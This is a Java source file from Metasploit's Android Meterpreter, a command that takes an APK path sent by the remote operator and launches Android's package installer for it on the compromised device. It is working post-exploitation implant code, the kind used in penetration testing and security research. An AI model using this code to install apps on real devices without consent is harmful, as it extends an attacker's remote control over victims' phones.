package com.metasploit.meterpreter.android;

import android.content.Context;

import android.content.Intent;
import android.net.Uri;

import java.io.File;

import com.metasploit.meterpreter.AndroidMeterpreter;
import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.command.Command;

public class appapi_app_install implements Command {

    private static final int TLV_EXTENSIONS                = 20000;
    private static final int TLV_TYPE_APP_APK_PATH         = TLVPacket.TLV_META_TYPE_STRING | (TLV_EXTENSIONS + 2914);
    private static final int TLV_TYPE_APP_ENUM             = TLVPacket.TLV_META_TYPE_UINT   | (TLV_EXTENSIONS + 2915);
    final Context context = AndroidMeterpreter.getContext();

    @Override
    public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
        String apkpath = request.getStringValue(TLV_TYPE_APP_APK_PATH);

        File file = new File(apkpath);
        if(!file.exists())
        {
            response.addOverflow(TLV_TYPE_APP_ENUM, 2); // File Not Found
            return ERROR_SUCCESS;
        }

        Intent intent = new Intent(Intent.ACTION_VIEW);
        intent.setDataAndType(Uri.fromFile(new File(apkpath)), "application/vnd.android.package-archive");
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);

        response.addOverflow(TLV_TYPE_APP_ENUM, 1); // Good
        return ERROR_SUCCESS;
    }
}
